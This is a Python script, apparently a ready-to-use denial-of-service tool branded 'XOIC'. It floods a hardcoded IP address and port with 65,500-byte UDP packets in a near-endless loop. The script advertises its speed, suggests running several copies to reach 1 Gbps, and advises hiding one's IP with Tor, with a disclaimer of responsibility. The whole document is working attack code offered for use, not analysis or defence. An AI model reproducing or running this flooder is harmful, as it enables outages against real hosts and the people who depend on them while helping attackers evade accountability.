import socket
import random
import time


from colorama import Fore, Back, Style
print("\n" * 100)
print(Fore.MAGENTA + Style.BRIGHT)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print(Fore.BLUE + "We aren't responsible to whatever thing you do using this tool, use it at your own risk.")
print(Fore.MAGENTA + "Use Orbot(Tor) To Hide your ip")
print("")
print(Fore.BLUE + "             XOIC Details: ")
print(Fore.MAGENTA + """
          |-----------------|
          |    GOGO   |
          |-----------------|
""")
print(Fore.BLUE + "DoS Speed: " + Fore.MAGENTA + "300+ Mbps")
print(Fore.BLUE + "[!] " + Fore.MAGENTA + "Pro Tip: Open & Use XOIC on multiple Windows to get 1Gbps")
print("")
bytes = random._urandom(65500)


ip = "172.65.221.187"
port = int("40144")

duration = "99999999999999"
print(" ")
timeout = time.time() + float(duration)
sent = 0
while True:
	if time.time() > timeout:
		break
		print(" NOOOOOO")
	else:
		pass

	sock.sendto(bytes,(ip, port))

	sent = sent + 1

	print(Fore.MAGENTA + "[+] " + Fore.BLUE + " " + Fore.MAGENTA + "Sent %s packet %s  port %s"%(sent, ip, port))
